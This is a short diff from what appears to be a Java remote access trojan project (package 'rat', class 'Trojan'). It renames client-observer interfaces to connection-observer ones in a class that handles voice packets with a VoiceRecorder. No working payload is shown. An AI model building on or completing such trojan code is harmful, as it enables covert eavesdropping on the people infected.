@@ -3,7 +3,7 @@ package de.sogomn.rat;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.VoicePacket;
 
-public final class Trojan implements IClientObserver {
+public final class Trojan implements IConnectionObserver {
 	
 	private VoiceRecorder voiceRecorder;
 	private byte[] lastData;
@@ -22,7 +22,7 @@ public final class Trojan implements IClientObserver {
 	}
 	
 	@Override
-	public void packetReceived(final ActiveClient client, final IPacket packet) {
+	public void packetReceived(final ActiveConnection client, final IPacket packet) {
 		if (packet instanceof VoicePacket) {
 			final VoicePacket voice = (VoicePacket)packet;
 			
@@ -33,7 +33,7 @@ public final class Trojan implements IClientObserver {
 	}
 	
 	@Override
-	public void clientDisconnected(final ActiveClient client) {
+	public void disconnected(final ActiveConnection client) {
 		final String address = client.getAddress();
 		final int port = client.getPort();
 		
